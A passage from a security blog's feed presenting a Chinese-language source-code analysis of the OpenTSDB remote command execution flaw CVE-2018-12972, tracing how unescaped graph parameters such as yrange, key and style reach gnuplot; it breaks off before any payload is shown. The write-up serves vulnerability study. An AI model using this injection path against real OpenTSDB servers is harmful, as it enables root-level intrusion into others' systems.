      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2542&quot;&gt;Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
    
      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
      <category term="rails" scheme="http://chybeta.github.io/tags/rails/"/>
    
      <category term="路径穿越" scheme="http://chybeta.github.io/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/"/>
    
  </entry>
  
  <entry>
    <title>OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】</title>
    <link href="http://chybeta.github.io/2018/08/11/OpenTSDB%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-12972%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/11/OpenTSDB远程命令执行漏洞分析-【CVE-2018-12972】/</id>
    <published>2018-08-11T03:33:13.000Z</published>
    <updated>2018-08-11T03:34:06.515Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2511" target="_blank" rel="external">OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】</a><br><a id="more"></a></p>
<h1 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225944-5c6989e6-94d2-1.png" alt="3.jpg"></p>
<p>Opentsdb是基于Hbase的分布式的，可伸缩的时间序列数据库。官方提供了一个web界面来提供对查询数据进行可视化分析，其背后的绘图由Gnuplot支持。其Github地址为： <a href="https://github.com/OpenTSDB/opentsdb" target="_blank" rel="external">https://github.com/OpenTSDB/opentsdb</a> 。在某些版本(比如2.3.0，以下分析以2.3.0版本为例)中，其提供的Web接口存在远程命令执行漏洞，一旦利用成功将以root权限执行。分析见下。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在opentsdb中，默认情况下<code>tsd.core.enable_ui</code>开启，允许通过http来进行rpc调用。当访问时<code>/q?xx=xxx</code>时，对应的rpc接口即<code>GraphHandler</code>。见 src/tsd/RpcManager.java:297：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initializeBuiltinRpcs</span><span class="params">(<span class="keyword">final</span> String mode,</span></span></div><div class="line">        <span class="keyword">final</span> ImmutableMap.Builder&lt;String, TelnetRpc&gt; telnet,</div><div class="line">        <span class="keyword">final</span> ImmutableMap.Builder&lt;String, HttpRpc&gt; http) &#123;</div><div class="line">    ...</div><div class="line">      <span class="keyword">if</span> (enableUi) &#123;</div><div class="line">        ...</div><div class="line">        http.put(<span class="string">"q"</span>, <span class="keyword">new</span> GraphHandler());</div><div class="line">        ...</div><div class="line">      &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>在 src/tsd/GraphHandler.java:108 execute中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(<span class="keyword">final</span> TSDB tsdb, <span class="keyword">final</span> HttpQuery query)</span> </span>&#123;</div><div class="line">   ...</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">     doGraph(tsdb, query);</div><div class="line">   &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">     query.internalError(e);</div><div class="line">   &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</div><div class="line">     query.badRequest(e.getMessage());</div><div class="line">   &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>跟入 <code>doGraph</code><br>其中接受参数在<br>src/tsd/GraphHandler.java:198 doGraph 中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doGraph</span><span class="params">(<span class="keyword">final</span> TSDB tsdb, <span class="keyword">final</span> HttpQuery query)</span></span></div><div class="line">  <span class="keyword">throws</span> IOException &#123;</div><div class="line">  <span class="keyword">final</span> String basepath = getGnuplotBasePath(tsdb, query);</div><div class="line"></div><div class="line">  <span class="comment">// 获取 start 参数,保证格式正确，否则抛出错误</span></div><div class="line">  <span class="keyword">long</span> start_time = DateTime.parseDateTimeString(</div><div class="line">    query.getRequiredQueryStringParam(<span class="string">"start"</span>),</div><div class="line">    query.getQueryStringParam(<span class="string">"tz"</span>));</div><div class="line"></div><div class="line">  ...</div><div class="line">  <span class="comment">// 获取 end 参数,保证格式正确，否则抛出错误</span></div><div class="line">  <span class="keyword">long</span> end_time = DateTime.parseDateTimeString(</div><div class="line">      query.getQueryStringParam(<span class="string">"end"</span>),</div><div class="line">      query.getQueryStringParam(<span class="string">"tz"</span>)); </div><div class="line">  </div><div class="line">  ...</div><div class="line">  <span class="comment">// 获取 o 参数</span></div><div class="line">  List&lt;String&gt; options = query.getQueryStringParams(<span class="string">"o"</span>);</div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="keyword">final</span> Plot plot = <span class="keyword">new</span> Plot(start_time, end_time,</div><div class="line">        DateTime.timezones.get(query.getQueryStringParam(<span class="string">"tz"</span>)));</div><div class="line">  <span class="comment">// 设置 plot 维度，无影响，可忽略</span></div><div class="line">  setPlotDimensions(query, plot);</div><div class="line"></div><div class="line">  <span class="comment">// 设置 plot 参数, 下文讲解</span></div><div class="line">  setPlotParams(query, plot);</div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="keyword">final</span> RunGnuplot rungnuplot = <span class="keyword">new</span> RunGnuplot(query, max_age, plot, basepath,</div><div class="line">          aggregated_tags, npoints);</div><div class="line"></div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="comment">// Fetch global annotations, if needed</span></div><div class="line">  <span class="keyword">if</span> (...) &#123;</div><div class="line">    ...</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// 执行画图程序</span></div><div class="line">    execGnuplot(rungnuplot, query);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从请求中获取对应值并设置plot参数在<code>setPlotParams(query, plot);</code>中完成：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setPlotParams</span><span class="params">(<span class="keyword">final</span> HttpQuery query, <span class="keyword">final</span> Plot plot)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> HashMap&lt;String, String&gt; params = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</div><div class="line">  <span class="keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; querystring = query.getQueryString();</div><div class="line">  String value;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"yrange"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"yrange"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2range"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"y2range"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"ylabel"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"ylabel"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2label"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"y2label"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"yformat"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format y"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2format"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format y2"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"xformat"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format x"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"ylog"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"logscale y"</span>, <span class="string">""</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2log"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"logscale y2"</span>, <span class="string">""</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"key"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"key"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"title"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"title"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"bgcolor"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"bgcolor"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"fgcolor"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"fgcolor"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"smooth"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"smooth"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"style"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"style"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// This must remain after the previous `if' in order to properly override</span></div><div class="line">  <span class="comment">// any previous `key' parameter if a `nokey' parameter is given.</span></div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"nokey"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"key"</span>, <span class="keyword">null</span>);</div><div class="line">  &#125;</div><div class="line">  plot.setParams(params);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为方便起见，整理一下http请求参数、java代码、plot参数的对应关系。有一些参数经过了<code>stringify</code>，用于后续的JSON格式的转换。经过<code>stringify</code>的参数都会被双引号包含（见下面的代码），难以后续逃逸使用。还有一些参数直接被设定为空值。这些参数对应如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ylabel</td>
<td style="text-align:center">put(“ylabel”, stringify(value))</td>
<td style="text-align:center">ylabel</td>
</tr>
<tr>
<td style="text-align:center">y2label</td>
<td style="text-align:center">put(“y2label”, stringify(value))</td>
<td style="text-align:center">y2label</td>
</tr>
<tr>
<td style="text-align:center">yformat</td>
<td style="text-align:center">put(“format y”, stringify(value))</td>
<td style="text-align:center">format y</td>
</tr>
<tr>
<td style="text-align:center">y2format</td>
<td style="text-align:center">put(“format y2”, stringify(value))</td>
<td style="text-align:center">format y2</td>
</tr>
<tr>
<td style="text-align:center">xformat</td>
<td style="text-align:center">put(“format x”, stringify(value))</td>
<td style="text-align:center">format x</td>
</tr>
<tr>
<td style="text-align:center">ylog</td>
<td style="text-align:center">put(“logscale y”, “”)</td>
<td style="text-align:center">logscale y</td>
</tr>
<tr>
<td style="text-align:center">y2log</td>
<td style="text-align:center">put(“logscale y2”, “”)</td>
<td style="text-align:center">logscale y2</td>
</tr>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">put(“title”, stringify(value))</td>
<td style="text-align:center">title</td>
</tr>
</tbody>
</table>
</div>
<p><code>stringify</code>定义在 src/tsd/GraphHandler.java:658 ：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">stringify</span><span class="params">(<span class="keyword">final</span> String s)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> StringBuilder buf = <span class="keyword">new</span> StringBuilder(<span class="number">1</span> + s.length() + <span class="number">1</span>);</div><div class="line">  buf.append(<span class="string">'"'</span>);</div><div class="line">  HttpQuery.escapeJson(s, buf);  <span class="comment">// Abusing this function gets the job done.</span></div><div class="line">  buf.append(<span class="string">'"'</span>);</div><div class="line">  <span class="keyword">return</span> buf.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>escapeJson</code>定义在 src/tsd/HttpQuery.java:471 中，主要对一些特殊字符进行转义：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">escapeJson</span><span class="params">(<span class="keyword">final</span> String s, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> <span class="keyword">int</span> length = s.length();</div><div class="line">  <span class="keyword">int</span> extra = <span class="number">0</span>;</div><div class="line">  <span class="comment">// First count how many extra chars we'll need, if any.</span></div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">char</span> c = s.charAt(i);</div><div class="line">    <span class="keyword">switch</span> (c) &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'"'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\\'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\b'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\f'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\n'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\r'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\t'</span>:</div><div class="line">        extra++;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c &lt; <span class="number">0x001F</span>) &#123;</div><div class="line">      extra += <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (extra == <span class="number">0</span>) &#123;</div><div class="line">    buf.append(s);  <span class="comment">// Nothing to escape.</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  buf.ensureCapacity(buf.length() + length + extra);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">char</span> c = s.charAt(i);</div><div class="line">    <span class="keyword">switch</span> (c) &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'"'</span>:  buf.append(<span class="string">'\\'</span>).append(<span class="string">'"'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\\'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'\\'</span>); <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\b'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'b'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\f'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'f'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\n'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'n'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\r'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'r'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\t'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'t'</span>);  <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c &lt; <span class="number">0x001F</span>) &#123;</div><div class="line">      buf.append(<span class="string">'\\'</span>).append(<span class="string">'u'</span>).append(<span class="string">'0'</span>).append(<span class="string">'0'</span>)</div><div class="line">        .append((<span class="keyword">char</span>) Const.HEX[(c &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>])</div><div class="line">        .append((<span class="keyword">char</span>) Const.HEX[c &amp; <span class="number">0x0F</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      buf.append(c);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>还有一些参数并没有经过转义等，如下表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">yrange</td>
<td style="text-align:center">put(“yrange”, value)</td>
<td style="text-align:center">yrange</td>
</tr>
<tr>
<td style="text-align:center">y2range</td>
<td style="text-align:center">put(“y2range”, value)</td>
<td style="text-align:center">y2range</td>
</tr>
<tr>
<td style="text-align:center">key</td>
<td style="text-align:center">put(“key”, value)</td>
<td style="text-align:center">key</td>
</tr>
<tr>
<td style="text-align:center">bgcolor</td>
<td style="text-align:center">put(“bgcolor”, value)</td>
<td style="text-align:center">bgcolor</td>
</tr>
<tr>
<td style="text-align:center">fgcolor</td>
<td style="text-align:center">put(“fgcolor”, value)</td>
<td style="text-align:center">fgcolor</td>
</tr>
<tr>
<td style="text-align:center">smooth</td>
<td style="text-align:center">put(“smooth”, value)</td>
<td style="text-align:center">smooth</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:center">put(“style”, value)</td>
<td style="text-align:center">style</td>
</tr>
</tbody>
</table>
</div>
<p>在完成参数设置后，创建了一个<code>RunGnuplot</code>对象，其中前面解析到的参数即对应的写入到了<code>plot</code>属性中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RunGnuplot</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> HttpQuery query;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> max_age;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> Plot plot;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String basepath;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> HashSet&lt;String&gt;[] aggregated_tags;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> npoints;</div><div class="line"></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="title">RunGnuplot</span><span class="params">(<span class="keyword">final</span> HttpQuery query, </span></span></div><div class="line">                     <span class="keyword">final</span> <span class="keyword">int</span> max_age,</div><div class="line">                     <span class="keyword">final</span> Plot plot,</div><div class="line">                     <span class="keyword">final</span> String basepath,</div><div class="line">                     <span class="keyword">final</span> HashSet&lt;String&gt;[] aggregated_tags,</div><div class="line">                     <span class="keyword">final</span> <span class="keyword">int</span> npoints) &#123;</div><div class="line">     ... </div><div class="line">     <span class="keyword">this</span>.plot = plot;</div><div class="line"></div><div class="line">     <span class="keyword">if</span> (IS_WINDOWS)</div><div class="line">       <span class="keyword">this</span>.basepath = basepath.replace(<span class="string">"\\"</span>, <span class="string">"\\\\"</span>).replace(<span class="string">"/"</span>, <span class="string">"\\\\"</span>);</div><div class="line">     <span class="keyword">else</span></div><div class="line">       <span class="keyword">this</span>.basepath = basepath;</div><div class="line">     ...</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>在<code>doGraph</code>的最后执行了<code>execGnuplot(rungnuplot, query);</code>，即src/tsd/GraphHandler.java:256<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">execGnuplot</span><span class="params">(RunGnuplot rungnuplot, HttpQuery query)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    gnuplot.execute(rungnuplot);</div><div class="line">  &#125; <span class="keyword">catch</span> (RejectedExecutionException e) &#123;</div><div class="line">    query.internalError(<span class="keyword">new</span> Exception(<span class="string">"Too many requests pending,"</span></div><div class="line">                                      + <span class="string">" please try again later"</span>, e));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这边<code>RunGnuplot</code>实现了<code>Runnable</code>接口，因此当线程开始执行时调用的是<code>RunGnuplot</code>的<code>run</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RunGnuplot</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</div><div class="line">  ...</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      execute();</div><div class="line">    &#125; <span class="keyword">catch</span> (BadRequestException e) &#123;</div><div class="line">      query.badRequest(e.getMessage());</div><div class="line">    &#125; <span class="keyword">catch</span> (GnuplotException e) &#123;</div><div class="line">      query.badRequest(<span class="string">"&lt;pre&gt;"</span> + e.getMessage() + <span class="string">"&lt;/pre&gt;"</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</div><div class="line">      query.internalError(e);</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">      query.internalError(e);</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>execute()</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> nplotted = runGnuplot(query, basepath, plot);</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>runGnuplot</code>，位置在src/tsd/GraphHandler.java:758<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">runGnuplot</span><span class="params">(<span class="keyword">final</span> HttpQuery query,</span></span></div><div class="line">                       <span class="keyword">final</span> String basepath,</div><div class="line">                       <span class="keyword">final</span> Plot plot) <span class="keyword">throws</span> IOException &#123;</div><div class="line">   <span class="keyword">final</span> <span class="keyword">int</span> nplotted = plot.dumpToFiles(basepath);</div><div class="line">   </div><div class="line">   ...</div><div class="line"></div><div class="line">   <span class="keyword">final</span> Process gnuplot = <span class="keyword">new</span> ProcessBuilder(GNUPLOT,</div><div class="line">     basepath + <span class="string">".out"</span>, basepath + <span class="string">".err"</span>, basepath + <span class="string">".gnuplot"</span>).start();</div><div class="line">   ...</div><div class="line"></div><div class="line">   <span class="keyword">return</span> nplotted;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>dumpToFiles</code>方法定义在<code>src/graph/Plot.java:196</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dumpToFiles</span><span class="params">(<span class="keyword">final</span> String basepath)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">  <span class="keyword">int</span> npoints = <span class="number">0</span>;</div><div class="line">  <span class="keyword">final</span> <span class="keyword">int</span> nseries = datapoints.size();</div><div class="line">  <span class="keyword">final</span> String datafiles[] = nseries &gt; <span class="number">0</span> ? <span class="keyword">new</span> String[nseries] : <span class="keyword">null</span>;</div><div class="line">  FileSystem.checkDirectory(<span class="keyword">new</span> 